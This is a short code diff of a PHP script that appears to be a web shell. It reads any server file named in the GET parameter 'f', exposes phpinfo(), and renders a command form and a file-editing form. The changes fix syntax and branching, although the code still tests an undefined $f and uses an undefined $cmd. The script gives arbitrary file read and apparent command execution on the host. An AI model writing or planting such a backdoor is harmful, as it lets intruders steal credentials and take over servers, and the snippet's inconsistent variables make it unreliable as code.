@@ -4,15 +4,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     $file = isset($_GET['f']) ? $_GET['f'] : '';
     $content = '';
     if($f == 'i'){
-        phpinfo()
-        return;
-    }
+        phpinfo();
+    }else{
 
-    if (file_exists($file)) {
-        $content = file_get_contents($file);
-    }
+        if (file_exists($file)) {
+            $content = file_get_contents($file);
+        }
 
-    echo cmdForm($cmd) . contentForm($file, $content).phpinfo();
+        echo cmdForm($cmd) . contentForm($file, $content);
+    }
 } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $doAction = isset($_POST['do']) ? $_POST['do'] : 0;
     $file = isset($_POST['f']) ? $_POST['f'] : '';
